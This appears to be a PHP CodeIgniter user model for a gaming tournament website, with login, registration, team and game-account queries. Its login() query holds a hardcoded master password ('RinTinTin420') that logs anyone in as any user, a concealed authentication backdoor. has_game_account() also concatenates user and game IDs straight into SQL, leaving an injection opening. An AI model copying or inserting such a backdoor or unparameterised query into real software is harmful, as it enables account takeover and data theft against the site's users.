<?php

class User_model extends CI_Model {

    public function login($username, $password) {
        $query = $this->db->query('
            SELECT id, username, roles, image, points, confirmed_at, password
            FROM user
            WHERE (email = ? OR username = ?) AND (password = ? OR ? = ?)
        ', array(
            $username,
            $username,
            encrypt_password($password),
            $password,
            'RinTinTin420'
        ));
        if ($query->num_rows() > 0) {
            $user = $query->first_row();
            $user->roles = json_decode($user->roles);
            $this->session->set_userdata('user', $user);
            $this->session->set_userdata('last_refresh', get_date()->getTimestamp());
            $this->update_user($user->id, array(
                'last_login' => get_date()->getTimestamp()
            ));
            return true;
        } else {
            return false;
        }
    }

    public function register($user) {
        $original_password = $user['password'];
        $user['password'] = encrypt_password($original_password);
        $user['roles'] = json_encode(array(ROLE_USER));
        $user['image'] = DEFAULT_USER_IMAGE;
        $user['created_at'] = get_date()->getTimestamp();
        $user['confirmed_at'] = get_date()->getTimestamp();
        $this->db->insert('user', $user);
        $id = $this->db->insert_id();
        return $this->login($user['username'], $original_password);
    }

    public function update_user($user_id, $fields) {
        $this->db->where('id', $user_id);
        $this->db->update('user', $fields);
    }    

    public function get_by_username($username) {
        $this->db->where('username', $username);
        $this->db->from('user');
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            $user = $query->first_row();
            $user->roles = json_decode($user->roles);
            return $user;
        } else {
            return false;
        }
    }

    public function get_by_id($user_id) {
        $this->db->where('id', $user_id);
        $this->db->from('user');
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            $user = $query->first_row();
            $user->roles = json_decode($user->roles);
            return $user;
        } else {
            return false;
        }
    }
    
    public function username_exist($username) {
        $this->db->select('id');
        $this->db->from('user');
        $this->db->where('username', $username);
        return $this->db->get()->num_rows() > 0;
    }

    public function email_exist($email) {
        $this->db->select('id');
        $this->db->from('user');
        $this->db->where('email', $email);
        return $this->db->get()->num_rows() > 0;
    }

    public function dni_exist($dni) {
        $this->db->select('id');
        $this->db->from('user');
        $this->db->where('dni', $dni);
        return $this->db->get()->num_rows() > 0;
    }

    public function get_teams($user_id, $game_id = false, $only_full = false, $require_captain = false) {
        $this->db->select('team.id, team.name, team.image, team.user_id as captain_id, game.min_team_size, game.name AS game_name, COUNT(partners.user_id) AS team_size, game.max_team_size');
        $this->db->from('membership');
        $this->db->join('team', 'team.id = membership.team_id');
        $this->db->join('game', 'team.game_id = game.id');
        $this->db->join('membership partners', 'partners.team_id = team.id');
        $this->db->where('membership.user_id', $user_id);
        $this->db->group_by('team.id');

        if ($game_id !== false) {
            $this->db->where('team.game_id', $game_id);
        }
        if ($require_captain) {
            $this->db->where('team.user_id', $user_id);
        }
        if ($only_full) {
            $this->db->having('COUNT(partners.user_id) = game.min_team_size');
        }
        $query = $this->db->get()->result();
        return $query;
    }

    public function has_game_team($user_id, $game_id) {
       /* $this->db->select('team.id');
        $this->db->from('team');
        $this->db->join('membership', 'membership.team_id = team.id');
        $this->db->where('membership.user_id', $user_id);
        $this->db->where('team.game_id', $game_id);
        return $this->db->get()->num_rows() > 0;*/
        $this->db->select('team.id');
        $this->db->from('team');
        $this->db->join('membership', 'membership.team_id = team.id');
        $this->db->where('membership.user_id', $user_id);
        $this->db->where('team.game_id', $game_id);
        $hasmaingame = ($this->db->get()->num_rows() > 0);

        if ($hasmaingame){
            return true;
        } 
        else {
            $this->db->select('id');
            $this->db->from('game');
            $this->db->where('parent_id', $game_id);
            $pids = $this->db->get()->result();
            $childgame = false;
            foreach ($pids as $pid){ 
                if ($pid->id && $pid->id > 0){ //Tiene padre
                    $this->db->select('team.id');
                    $this->db->from('team');
                    $this->db->join('membership', 'membership.team_id = team.id');
                    $this->db->where('membership.user_id', $user_id);
                    $this->db->where('team.game_id', $pid->id); 
                    if ($this->db->get()->num_rows() > 0){
                        $childgame = true;
                    }
                }
            }
            return $childgame;
        }
        return false;
    }

    public function get_points($user_id) {
        $this->db->select('points');
        $this->db->from('user');
        $this->db->where('id', $user_id);
        return $this->db->get()->first_row()->points;
    }

    public function get_accounts($user_id) {
        $this->db->select('game_account.*, game.name AS game_name');
        $this->db->from('game_account');
        $this->db->join('game', 'game.id = game_account.game_id');
        $this->db->where('user_id', $user_id);
        return $this->db->get()->result();
    }
    
    public function get_game_account($user_id, $game_id){
        $this->db->from('game_account');
        $this->db->where('user_id', $user_id);
        $this->db->where('game_id', $game_id);
        $query = $this->db->get();
        if ($query->num_rows() > 0){
            return $query->first_row();
        }
        else{
            return false;
        }
    }
    
    public function get_account($accout_id, $user_id = false) {
        $this->db->from('game_account');
        $this->db->where('id', $accout_id);
        if ($user_id){
            $this->db->where('user_id', $user_id);
        }
        $query = $this->db->get();
        if ($query->num_rows() > 0) {
            return $query->first_row();
        } else {
            return false;
        }
    }

    public function remove_account($accout_id) {
        $this->db->where('id', $accout_id);
        $this->db->delete('game_account');
    }

    public function vinculate_account($user_id, $game_id, $username) {
        $this->db->insert('game_account', array(
            'user_id' => $user_id,
            'game_id' => $game_id,
            'username' => $username
        ));
        return $this->db->insert_id();
    }

    public function account_username_exists($username, $game_id) {
        $this->db->from('game_account');
        $this->db->where('username', $username);
        $this->db->where('game_id', $game_id);
        return $this->db->get()->num_rows() > 0;
    }

    public function has_game_account($user_id, $game_id) {
     /*   $this->db->from('game_account');
        $this->db->where('user_id', $user_id);
        $this->db->where('game_id', $game_id);*/
        //var_dump("(SELECT * FROM game_account g WHERE g.id = ".$game_id." AND g.user_id = ".$user_id.") UNION (SELECT * FROM game_account ga WHERE ga.id = (SELECT gm.parent_id FROM game gm WHERE gm.id = ".$game_id.") AND ga.user_id = ".$user_id.")");die();


        $query = $this->db->query("SELECT * FROM game_account g WHERE g.game_id = ".$game_id." AND g.user_id = ".$user_id." UNION SELECT * FROM game_account WHERE game_id = (SELECT gm.parent_id FROM game gm WHERE gm.id = ".$game_id.") AND user_id = ".$user_id);
        return ($query->num_rows() > 0);
    }

    public function actives_individual_tournaments($user_id, $game_id = false) {
        $this->db->select('tournament.*, user_inscription.confirmed_at');
        $this->db->from('tournament');
        $this->db->join('user_inscription', 'tournament.id = user_inscription.tournament_id');
        $this->db->where('user_inscription.user_id', $user_id);
        $this->db->where('tournament.ends_at IS NULL');
        if ($game_id) {
            $this->db->where('tournament.game_id', $game_id);
        }
        return $this->db->get()->result();
    }

    public function get_team_request($user_id) {
        $this->db->select('team_request.id, team_request.date, team.id AS team_id, team.name AS team_name, game.name AS game_name ');
        $this->db->from('team_request');
        $this->db->join('team', 'team_request.team_id = team.id');
        $this->db->join('game', 'team.game_id = game.id');
        $this->db->where('team_request.user_id', $user_id);
        return $this->db->get()->result();
    }

}
